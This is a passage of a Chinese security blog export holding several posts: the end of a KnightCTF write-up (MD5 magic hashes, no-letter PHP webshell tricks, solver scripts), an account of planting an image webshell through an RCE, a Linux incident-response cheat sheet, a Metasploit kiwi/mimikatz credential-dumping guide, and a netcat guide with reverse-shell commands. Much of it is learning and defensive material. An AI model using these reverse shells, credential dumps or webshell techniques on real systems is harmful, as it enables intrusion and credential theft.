&#123;</span><br><span class="line">    <span class="keyword">print</span> show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一个md5碰撞，但是他把我们常见的都给过滤掉了，加密前加密后都必须是<code>0e纯数字</code>的形式，网上搜半天也没有，我们就写了个脚本自己跑</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171527103.png" alt="image-20220121171527103"></p>
<p>最后跑出来了，这里就总结一下常见的这种md5碰撞可用的</p>
<p>0e1137126905</p>
<p>0e215962017</p>
<p>0e730083352</p>
<p>0e807097110</p>
<p>0e840922711</p>
<h2 id="Most-Secure-Calculator-2"><a href="#Most-Secure-Calculator-2" class="headerlink" title="Most Secure Calculator - 2"></a>Most Secure Calculator - 2</h2><p>哇这个是真的难，把这个做出来我是真的有成就感！！！</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171726495.png" alt="image-20220121171726495"></p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121171737535.png" alt="image-20220121171737535"></p>
<p>还是命令执行，但是过滤了所有的字母和大部分的符号，这怎么办呢！还好我以前就看过p神的那个无字母webshell，</p>
<p><a href="https://blog.csdn.net/qq_45521281/article/details/105656936">命令执行中关于PHP正则表达式的一些绕过方法_WHOAMIAnony的博客-CSDN博客_php正则绕过</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></p>
<p>URL编码取反绕过（最简单的）</p>
<p>注意： 该方法只适用于PHP7</p>
<p><strong>对想要传入的参数，先进行URL解码再取反</strong></p>
<p>例如传入构造一个phpinfo();（生成payload的时候先取反再URL编码）</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/asd.png" alt="img"></p>
<h2 id="Keep-Calculating"><a href="#Keep-Calculating" class="headerlink" title="Keep Calculating"></a>Keep Calculating</h2><p>哈哈随便找了下又弄出来个题，正好最近在学py</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121175705128.png" alt="image-20220121175705128"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line">y = <span class="number">2</span></span><br><span class="line">answer = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x &lt; <span class="number">667</span>:</span><br><span class="line">    <span class="built_in">print</span>(x)</span><br><span class="line">    answer += ((x * y) + (x * (<span class="number">10</span>**<span class="built_in">len</span>(<span class="string">f&#x27;<span class="subst">&#123;y&#125;</span>&#x27;</span>)))+y)</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>



<h2 id="Reverse-The-Answer"><a href="#Reverse-The-Answer" class="headerlink" title="Reverse The Answer"></a>Reverse The Answer</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121181401026.png" alt="image-20220121181401026"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">1</span></span><br><span class="line">answer = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x &lt; <span class="number">544</span>:</span><br><span class="line">    calculation = (x * (x + <span class="number">1</span>)) + (<span class="number">2</span> * (x + <span class="number">1</span>))</span><br><span class="line">    reverssed_calc = <span class="built_in">int</span>(<span class="built_in">str</span>(calculation)[::-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(x,reverssed_calc)</span><br><span class="line">    <span class="keyword">if</span> reverssed_calc%<span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        answer += reverssed_calc</span><br><span class="line">    x += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(answer)</span><br></pre></td></tr></table></figure>

<h2 id="Square-Sum"><a href="#Square-Sum" class="headerlink" title="Square Sum"></a>Square Sum</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121183643809.png" alt="image-20220121183643809"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = <span class="number">25000</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i1 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> i2 <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        <span class="keyword">if</span> i1**<span class="number">2</span> + i2**<span class="number">2</span> == data:</span><br><span class="line">            buffer = [i1,i2]</span><br><span class="line">            result.append(buffer)</span><br><span class="line">result.sort()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h2 id="Something-In-Common"><a href="#Something-In-Common" class="headerlink" title="Something In Common"></a>Something In Common</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121184433577.png" alt="image-20220121184433577"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hcf</span>(<span class="params">x, y</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;该函数返回两个数的最大公约数&quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment"># 获取最小值</span></span><br><span class="line">    <span class="keyword">if</span> x &gt; y:</span><br><span class="line">        smaller = y</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        smaller = x</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, smaller + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">if</span> ((x % i == <span class="number">0</span>) <span class="keyword">and</span> (y % i == <span class="number">0</span>)):</span><br><span class="line">            hcf = i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> hcf</span><br><span class="line"><span class="comment"># 用户输入两个数字</span></span><br><span class="line">num1 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入第一个数字: &quot;</span>))</span><br><span class="line">num2 = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;输入第二个数字: &quot;</span>))</span><br><span class="line"></span><br><span class="line">data = hcf(num1, num2)</span><br><span class="line">data_list = <span class="built_in">list</span>(<span class="built_in">str</span>(data))</span><br><span class="line">data_list = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> data_list]</span><br><span class="line">result = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> data_list:</span><br><span class="line">    result += item</span><br><span class="line"><span class="built_in">print</span>(result*<span class="number">1234</span>)</span><br></pre></td></tr></table></figure>

<h2 id="Find-The-Number"><a href="#Find-The-Number" class="headerlink" title="Find The Number"></a>Find The Number</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121185503423.png" alt="image-20220121185503423"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>/<span class="number">2</span>**n+g(n-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(g(<span class="number">25</span>))</span><br></pre></td></tr></table></figure>



<h2 id="Unzip-Me"><a href="#Unzip-Me" class="headerlink" title="Unzip Me"></a>Unzip Me</h2><p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121200432945.png" alt="image-20220121200432945"></p>
<p>下载下来改下后缀名zip，然后一直解压，最后解压出来的东西用记事本打开</p>
<p><img src="/2022/01/21/knight-ctf-web-wp/image-20220121200600434.png" alt="image-20220121200600434">下面那两个,是我自己写的，很容易就发现了嘛，两个字符交换下位置，就出来咯~</p>
<p>今天晚上还要去realwordctf看热闹，不说了继续做题了</p>
<p>还有好多我不会的东西，什么流量包什么的，以后一定要继续好好学，打算过段时间学学逆向。</p>
<p>我不能休息我还能学    ⊂(‘ω’⊂ )))Σ≡=─༄༅༄༅༄༅༄༅༄༅</p>
<p>还有汇编没怎么懂</p>
<p><a href="https://www.cnblogs.com/fate-/p/12880508.html">如何运行汇编程序 - ice–cream - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>-Experience</category>
      </categories>
  </entry>
  <entry>
    <title>linux下php-rce下的小技巧</title>
    <url>/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="linux下php-rce下的小技巧"><a href="#linux下php-rce下的小技巧" class="headerlink" title="linux下php-rce下的小技巧"></a>linux下php-rce下的小技巧</h1><p>最近遇到一个机器，有命令执行漏洞</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111021705807.png" alt="image-20240111021705807"></p>
<p>我在bp里面一直试了两个多小时，终于解决了。没想到居然是用这么朴素的方法。。。</p>
<p>由于只是一个rce</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111022200983.png" alt="image-20240111022200983"></p>
<p>我期间尝试过如下的方法</p>
<h2 id="1-反弹shell"><a href="#1-反弹shell" class="headerlink" title="1.反弹shell"></a>1.反弹shell</h2><p>用各种反弹shell的命令尝试反弹shell，失败，原因大概有两个，不是命令太长就是命令中包含了&lt;字符，没错，就是这个字符，</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111022439195.png" alt="image-20240111022439195"></p>
<p>只要有这个东西还有些我没试出来的其他的字符，那就会直接报错，可能是这套系统的问题或者是对面有防火墙的问题。</p>
<p>总之能想到的linux反弹shell，能搜到的，能找到的，我都试过了。无果</p>
<h2 id="2-echo写文件"><a href="#2-echo写文件" class="headerlink" title="2.echo写文件"></a>2.echo写文件</h2><p>既然反弹shell没法，那我直接写文件不就对了吗，问题还是在&lt;上面，一旦echo创建的文件中含有&lt;这个字符，依然会直接报错，那就断绝了我们写php文件的想法</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111023344212.png" alt="image-20240111023344212"></p>
<h2 id="3-echo-gt-gt-写到文件末尾"><a href="#3-echo-gt-gt-写到文件末尾" class="headerlink" title="3.echo&gt;&gt;写到文件末尾"></a>3.echo&gt;&gt;写到文件末尾</h2><p>通过cat我读取到对面的php源码（图是我自己复制到txt方便看的）</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111023745249.png" alt="image-20240111023745249"></p>
<p>他的末尾都没有?&gt;结尾符号，那我们可以尝试通过echo&gt;&gt;，直接写到原有文件的末尾。这样我们就不用使用前面那个字符了。</p>
<p>但是问题又出现了一旦检测到<code>$</code>符号后面跟了东西，那就会把$和跟的东西全部删掉然后写入</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111024651789.png" alt="image-20240111024651789"></p>
<p>访问目标文件，</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111024705013.png" alt="image-20240111024705013"></p>
<p>可以看到$后面跟了东西的，$和跟的东西都被删掉了。又没办法写文件进去了</p>
<h2 id="4-wget下文件"><a href="#4-wget下文件" class="headerlink" title="4.wget下文件"></a>4.wget下文件</h2><p>没办法，不让写，那我们直接下进去呗</p>
<p>然而，wget确实可以使用，下载也能下，但是！！下的东西里面他也会检测$和跟的东西都会被删掉。啊？</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111025030683.png" alt="image-20240111025030683"></p>
<p>可以看到，我的马什么都没。只有一个文本（我是cat看过的）</p>
<p>然后我还试了脏数据绕过，加了很多文本在前面，结果如下</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111025203676.png" alt="image-20240111025203676"></p>
<p>翻到最后，马还是被它删了。</p>
<h1 id="最后的解决办法"><a href="#最后的解决办法" class="headerlink" title="最后的解决办法"></a>最后的解决办法</h1><p>没想到是图片马，中间还尝试过一些其他的方法，上传过大马，翻配置文件链接数据库（对面只支持本地连接），都没用。</p>
<p>然后我后面还想在机器上下载一个上传小马（半夜了脑子糊了），突然旁边搜到一个《php上传图片马绕过》，好好好，直接上传图片马。</p>
<p>然后用mv命令将上传的图片马的后缀名改成php，<code>mv file.txt new_name.txt</code></p>
<p>终于成了！</p>
<p><img src="/2024/01/11/linux%E4%B8%8Bphp-rce%E4%B8%8B%E7%9A%84%E5%B0%8F%E6%8A%80%E5%B7%A7/image-20240111025616390.png" alt="image-20240111025616390"></p>
<p>最后师傅们要是还有什么其他的方法欢迎评论区赐教</p>
]]></content>
      <categories>
        <category>-penetration</category>
      </categories>
  </entry>
  <entry>
    <title>linux应急响应命令</title>
    <url>/2022/09/22/linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h1 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">alias  #查看服务器别名，检查攻击者是否设置别名误导工程师</span><br><span class="line"></span><br><span class="line">/home/用户名/.bashrc   #别名文件</span><br><span class="line"> </span><br><span class="line">rm -rf /usr/.SQL-Unix/.SQL/.db  #删除恶意的别名文件</span><br><span class="line"> </span><br><span class="line">ls -al ps  #查看相应的命令的命令文件内容</span><br><span class="line"></span><br><span class="line">find . -type f -mtime 1  #查找当前目录下，最近24-48小时修改过的常规文件</span><br><span class="line"></span><br><span class="line">find /www/storage | xargs grep &quot;eval(&quot;  #查找webshell</span><br><span class="line"></span><br><span class="line">竞争脚本删除不死马，或者重启nginx来杀不死马（如果生产环境允许）</span><br><span class="line"></span><br><span class="line">账号安全，历史命令，异常端口，异常进程，开机启动项，定时任务，重要目录</span><br></pre></td></tr></table></figure>

<h1 id="账号安全："><a href="#账号安全：" class="headerlink" title="账号安全："></a>账号安全：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line">awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd   #查询特权用户特权用户(uid 为0)</span><br><span class="line"></span><br><span class="line">awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow    #查询可以远程登录的帐号信息</span><br><span class="line"></span><br><span class="line">more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;   #除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line"></span><br><span class="line">usermod -L user  #禁用帐号，帐号无法登录，/etc/shadow 第二栏为 ! 开头</span><br><span class="line"></span><br><span class="line">user del user  #删除 user 用户</span><br><span class="line"></span><br><span class="line">userdel -r user  #将删除 user 用户，并且将 /home 目录下的 user 目录一并删除</span><br><span class="line"></span><br><span class="line">passwd user  #修改密码</span><br><span class="line"></span><br><span class="line">adduser user  #添加账户</span><br><span class="line"></span><br><span class="line">useradd -u 544 -d /usr/testuser1  -g users -m  testuser1 #添加账户</span><br><span class="line"></span><br><span class="line">who  #查看当前登录用户（tty 本地登陆 pts 远程登录）</span><br><span class="line"></span><br><span class="line">w  #查看系统信息，想知道某一时刻用户的行为</span><br><span class="line"></span><br><span class="line">uptime  #查看登陆多久、多少用户，负载状态</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件：</span><br><span class="line"></span><br><span class="line">/etc/passwd  #用户信息文件</span><br><span class="line"></span><br><span class="line">/etc/shadow  #影子文件</span><br></pre></td></tr></table></figure>

<h1 id="历史命令："><a href="#历史命令：" class="headerlink" title="历史命令："></a>历史命令：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">history   #查看历史命令</span><br><span class="line"></span><br><span class="line">cat .bash_history &gt;&gt; history.tx  #进入用户目录下，导出历史命令</span><br></pre></td></tr></table></figure>

<h1 id="异常端口："><a href="#异常端口：" class="headerlink" title="异常端口："></a>异常端口：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line">lsof -i port  #可以查看是谁在占用此端口号</span><br><span class="line"></span><br><span class="line">netstat -anpt  #-t是tcp相关选项，-a是所有 -p是显示程序名字 -n是拒绝显示别名</span><br><span class="line"></span><br><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）  #查看pid对应的进程文件路径</span><br><span class="line"></span><br><span class="line">ps aux|grep pid  #可以根据端口那边的pid定位进程</span><br><span class="line"></span><br><span class="line">ps -ef|grep pname  #可以根据端口那边的进程名称定位进程</span><br></pre></td></tr></table></figure>

<h1 id="异常进程："><a href="#异常进程：" class="headerlink" title="异常进程："></a>异常进程：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">ps -aux  #显示所有进程信息</span><br><span class="line"></span><br><span class="line">ps -elf   #和上面大部分差不多</span><br><span class="line"></span><br><span class="line">top  #以全屏交互式的界面显示进程排名</span><br><span class="line"></span><br><span class="line">pstree -aup  #显示个进程树</span><br><span class="line"></span><br><span class="line">运行 ls -l /proc/$PID/exe 或 file /proc/$PID/exe（$PID 为对应的 pid 号）  #查看pid对应的进程文件路径</span><br><span class="line"></span><br><span class="line">ps aux|grep pid  #可以根据端口那边的pid定位进程</span><br><span class="line"></span><br><span class="line">ps -ef|grep pname  #可以根据端口那边的进程名称定位进程</span><br><span class="line"></span><br><span class="line">Kill -9 #强行中断进程，有丢失数据的风险</span><br><span class="line"></span><br><span class="line">Kill -9 -1 #强行终止当前用户下所有进程，</span><br><span class="line"></span><br><span class="line">pkill -U：指定用户；-t：指定终端  #可以杀死指定用户的所有进程</span><br><span class="line"></span><br><span class="line">find /www/storage | xargs grep &quot;eval(&quot;  #查找webshell</span><br></pre></td></tr></table></figure>

<h1 id="检查开机启动项："><a href="#检查开机启动项：" class="headerlink" title="检查开机启动项："></a>检查开机启动项：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">runlevel  #查看运行级别</span><br><span class="line"></span><br><span class="line">systemctl list-unit-files  #查看开机启动项，包含原生服务</span><br><span class="line"></span><br><span class="line">chkconfig  #查看开机启动项</span><br><span class="line"></span><br><span class="line">systemctl list-unit-files |   grep enable  </span><br><span class="line"></span><br><span class="line">systemctl enable zabbix-server.service  #为服务添加开机启动项</span><br><span class="line"></span><br><span class="line">systemctl disable zabbix-server.service  #移除开机启动项的服务</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">文件：</span><br><span class="line"></span><br><span class="line">/etc/rc.local   #配置文件</span><br><span class="line"></span><br><span class="line">/etc/rc.d/rc[0~6].d  #配置文件</span><br><span class="line"></span><br><span class="line">说明：当我们需要开机启动自己的脚本时，只需要将可执行脚本</span><br><span class="line"></span><br><span class="line">丢在 /etc/init.d 目录下，然后在 /etc/rc.d/rc*.d 文件中建立软链接即可。</span><br></pre></td></tr></table></figure>

<h1 id="定时任务："><a href="#定时任务：" class="headerlink" title="定时任务："></a>定时任务：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令：</span><br><span class="line"></span><br><span class="line">crontab -l  #列出某个用户cron服务的详细内容</span><br><span class="line"></span><br><span class="line">crontab -r  #删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line"></span><br><span class="line">crontab -e #使用编辑器编辑当前的crontab文件</span><br></pre></td></tr></table></figure>

<h1 id="重要目录："><a href="#重要目录：" class="headerlink" title="重要目录："></a>重要目录：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志文件：</span><br><span class="line"></span><br><span class="line">/var/log/cron  #记录与系统定时任务相关的曰志</span><br><span class="line"></span><br><span class="line">/var/log/cups/	#记录打印信息的曰志</span><br><span class="line"></span><br><span class="line">/var/log/dmesg	#记录了系统在开机时内核自检的信总。也可以使用dmesg命令直接查看内核自检信息</span><br><span class="line"></span><br><span class="line">/var/log/btmp	#记录错误登陆的日志。这个文件是二进制文件，不能直接用Vi查看，而要使用lastb命令查看。</span><br><span class="line"></span><br><span class="line">/var/log/lasllog	#记录系统中所有用户最后一次的登录时间的曰志。这个文件也是二进制文件.不能直接用Vi 查看。而要使用lastlog命令查看</span><br><span class="line"></span><br><span class="line">/var/Iog/mailog	#记录邮件信息的曰志</span><br><span class="line"></span><br><span class="line">/var/log/messages	#它是核心系统日志文件，其中包含了系统启动时的引导信息，以及系统运行时的其他状态消息。I/O 错误、网络错误和其他系统错误都会记录到此文件中。其他信息，比如某个人的身份切换为 root，已经用户自定义安装软件的日志，也会在这里列出。</span><br><span class="line"></span><br><span class="line">/var/log/secure	#记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh的登录、su切换用户，sudo授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</span><br><span class="line"></span><br><span class="line">/var/log/wtmp	#永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件。同样，这个文件也是二进制文件.不能直接用Vi查看，而要使用last命令查看</span><br><span class="line"></span><br><span class="line">/var/tun/ulmp	#记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。同样，这个文件不能直接用Vi查看，而要使用w、who、users等命令查看</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-yingji</category>
      </categories>
  </entry>
  <entry>
    <title>msf工具  kiwi模块</title>
    <url>/2022/08/22/msf%E5%B7%A5%E5%85%B7-kiwi%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h1 id="msf工具-kiwi模块"><a href="#msf工具-kiwi模块" class="headerlink" title="msf工具  kiwi模块"></a>msf工具  kiwi模块</h1><p>使用kiwi模块需要system权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。提到system有两个方法，一是当前的权限是administrator用户，二是利用其它手段先提权到administrator用户。然后administrator用户可以直接getsystem到system权限</p>
<h2 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h2><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps</span><br><span class="line">migrate 476</span><br></pre></td></tr></table></figure>



<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>加载kiwi模块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load kiwi</span><br></pre></td></tr></table></figure>

<p>查看kiwi模块的使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help kiwi</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件/编码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">creds_all</span><br><span class="line"></span><br><span class="line">该命令可以列举系统中的明文密码</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd</span><br><span class="line"></span><br><span class="line">kiwi_cmd 模块可以让我们使用mimikatz的全部功能，该命令后面接 mimikatz.exe 的命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kiwi_cmd sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>-tools</category>
      </categories>
  </entry>
  <entry>
    <title>nc工具安装与使用</title>
    <url>/2022/08/22/nc%E5%B7%A5%E5%85%B7%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h1 id="nc工具安装与使用"><a href="#nc工具安装与使用" class="headerlink" title="nc工具安装与使用"></a>nc工具安装与使用</h1><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p><a href="https://eternallybored.org/misc/netcat/">https://eternallybored.org/misc/netcat/</a></p>
<p>下载下来就好</p>
<p>打开命令界面 <a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a></p>
<p>输入nc命令即可</p>
<p>我是在测试sparkStreaming时候用到</p>
<p>输入 nc -L -p 9999 </p>
<h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p><code>yum -y install nc</code></p>
<h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>常用的一些命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-4 IPv4模式</span><br><span class="line">-6 IPv6模式</span><br><span class="line">-b, --bluetooth 蓝牙模式 (默认为L2CAP协议)</span><br><span class="line">-e,--exec=CMD 连接建立后执行命令</span><br><span class="line">-l 监听入站连接</span><br><span class="line">-n 指定数字的IP地址，不能用hostname</span><br><span class="line"></span><br><span class="line">-u UDP模式</span><br><span class="line">-t TCP模式（默认模式）</span><br><span class="line"></span><br><span class="line">-v 详细输出——用两个-v可得到更详细的内容</span><br><span class="line">-w，--time=SECONDS 连接建立后的延时</span><br><span class="line">-z 扫描模式，不会发送任何数据</span><br><span class="line">-T，--ttl=TTL 自定义初始TTL</span><br><span class="line">-z 将输入输出关掉——用于扫描时</span><br><span class="line">-x，--transfer 文件传输模式</span><br><span class="line">-X ，--rev-transfer 反向文件传输模式</span><br><span class="line">-s，--address=ADDRESS 本地源ip</span><br></pre></td></tr></table></figure>

<h2 id="使用举例"><a href="#使用举例" class="headerlink" title="使用举例"></a>使用举例</h2><ul>
<li><p>1 . 端口扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -z -v -n 172.31.100.7 21-25</span><br></pre></td></tr></table></figure></li>
<li><p>2 . 交互数据传输</p>
<p>发送端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 172.31.100.7 4444</span><br></pre></td></tr></table></figure>

<p>接收端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></li>
<li><p>3 . 文件传输</p>
<p>发送端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444 &lt; file.txt</span><br></pre></td></tr></table></figure>

<p>接收端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -n 172.31.100.7 &gt; file.txt</span><br></pre></td></tr></table></figure></li>
<li><p>4 . 反弹shell（不会被防火墙拦截）</p>
<p>发送端(linux)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc 192.168.110.20 4445 -e /bin/bash   </span><br></pre></td></tr></table></figure>

<p>（windows）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc.exe -e cmd 192.168.110.20 4445 </span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure></li>
<li><p>5.端口转发</p>
<p>本地端口转发，将<a href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a>的8888端口转发到22端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lp 8888 -c &quot;nc 127.0.0.1 22&quot;</span><br></pre></td></tr></table></figure></li>
</ul>
